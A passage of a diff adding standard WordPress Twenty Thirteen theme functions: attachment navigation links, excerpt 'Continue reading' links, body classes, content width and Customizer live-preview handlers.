+				$next_id = $attachment_ids[ ( $idx + 1 ) % count( $attachment_ids ) ];
+				break;
+			}
+		}
+
+		// get the URL of the next image attachment...
+		if ( $next_id )
+			$next_attachment_url = get_attachment_link( $next_id );
+
+		// or get the URL of the first image attachment.
+		else
+			$next_attachment_url = get_attachment_link( reset( $attachment_ids ) );
+	}
+
+	printf( '<a href="%1$s" title="%2$s" rel="attachment">%3$s</a>',
+		esc_url( $next_attachment_url ),
+		the_title_attribute( array( 'echo' => false ) ),
+		wp_get_attachment_image( $post->ID, $attachment_size )
+	);
+}
+endif;
+
+/**
+ * Return the post URL.
+ *
+ * @uses get_url_in_content() to get the URL in the post meta (if it exists) or
+ * the first link found in the post content.
+ *
+ * Falls back to the post permalink if no URL is found in the post.
+ *
+ * @since Twenty Thirteen 1.0
+ *
+ * @return string The Link format URL.
+ */
+function twentythirteen_get_link_url() {
+	$content = get_the_content();
+	$has_url = get_url_in_content( $content );
+
+	return ( $has_url ) ? $has_url : apply_filters( 'the_permalink', get_permalink() );
+}
+
+if ( ! function_exists( 'twentythirteen_excerpt_more' ) && ! is_admin() ) :
+/**
+ * Replaces "[...]" (appended to automatically generated excerpts) with ...
+ * and a Continue reading link.
+ *
+ * @since Twenty Thirteen 1.4
+ *
+ * @param string $more Default Read More excerpt link.
+ * @return string Filtered Read More excerpt link.
+ */
+function twentythirteen_excerpt_more( $more ) {
+	$link = sprintf( '<a href="%1$s" class="more-link">%2$s</a>',
+		esc_url( get_permalink( get_the_ID() ) ),
+			/* translators: %s: Name of current post */
+			sprintf( __( 'Continue reading %s <span class="meta-nav">&rarr;</span>', 'twentythirteen' ), '<span class="screen-reader-text">' . get_the_title( get_the_ID() ) . '</span>' )
+		);
+	return ' &hellip; ' . $link;
+}
+add_filter( 'excerpt_more', 'twentythirteen_excerpt_more' );
+endif;
+
+/**
+ * Extend the default WordPress body classes.
+ *
+ * Adds body classes to denote:
+ * 1. Single or multiple authors.
+ * 2. Active widgets in the sidebar to change the layout and spacing.
+ * 3. When avatars are disabled in discussion settings.
+ *
+ * @since Twenty Thirteen 1.0
+ *
+ * @param array $classes A list of existing body class values.
+ * @return array The filtered body class list.
+ */
+function twentythirteen_body_class( $classes ) {
+	if ( ! is_multi_author() )
+		$classes[] = 'single-author';
+
+	if ( is_active_sidebar( 'sidebar-2' ) && ! is_attachment() && ! is_404() )
+		$classes[] = 'sidebar';
+
+	if ( ! get_option( 'show_avatars' ) )
+		$classes[] = 'no-avatars';
+
+	return $classes;
+}
+add_filter( 'body_class', 'twentythirteen_body_class' );
+
+/**
+ * Adjust content_width value for video post formats and attachment templates.
+ *
+ * @since Twenty Thirteen 1.0
+ */
+function twentythirteen_content_width() {
+	global $content_width;
+
+	if ( is_attachment() )
+		$content_width = 724;
+	elseif ( has_post_format( 'audio' ) )
+		$content_width = 484;
+}
+add_action( 'template_redirect', 'twentythirteen_content_width' );
+
+/**
+ * Add postMessage support for site title and description for the Customizer.
+ *
+ * @since Twenty Thirteen 1.0
+ *
+ * @param WP_Customize_Manager $wp_customize Customizer object.
+ */
+function twentythirteen_customize_register( $wp_customize ) {
+	$wp_customize->get_setting( 'blogname' )->transport         = 'postMessage';
+	$wp_customize->get_setting( 'blogdescription' )->transport  = 'postMessage';
+	$wp_customize->get_setting( 'header_textcolor' )->transport = 'postMessage';
+
+	if ( isset( $wp_customize->selective_refresh ) ) {
+		$wp_customize->selective_refresh->add_partial( 'blogname', array(
+			'selector' => '.site-title',
+			'container_inclusive' => false,
+			'render_callback' => 'twentythirteen_customize_partial_blogname',
+		) );
+		$wp_customize->selective_refresh->add_partial( 'blogdescription', array(
+			'selector' => '.site-description',
+			'container_inclusive' => false,
+			'render_callback' => 'twentythirteen_customize_partial_blogdescription',
+		) );
+	}
+}
+add_action( 'customize_register', 'twentythirteen_customize_register' );
+
+/**
+ * Render the site title for the selective refresh partial.
+ *
+ * @since Twenty Thirteen 1.9
+ * @see twentythirteen_customize_register()
+ *
+ * @return void
+ */
+function twentythirteen_customize_partial_blogname() {
+	bloginfo( 'name' );
+}
+
+/**
+ * Render the site tagline for the selective refresh partial.
+ *
+ * @since Twenty Thirteen 1.9
+ * @see twentythirteen_customize_register()
+ *
+ * @return void
+ */
+function twentythirteen_customize_partial_blogdescription() {
+	bloginfo( 'description' );
+}
+
+/**
+ * Enqueue Javascript postMessage handlers for the Customizer.
+ *
+ * Binds JavaScript handlers to make the Customizer preview
+ * reload changes asynchronously.
+ *
+ * @since Twenty Thirteen 1.0
+ */
+function twentythirteen_customize_preview_js() {
+	wp_enqueue_script( 'twentythirteen-customizer', get_template_directory_uri() . '/js/theme-customizer.js', array( 'customize-preview' ), '20141120', true );
+}
+add_action( 'customize_preview_init', 'twentythirteen_customize_preview_js' );
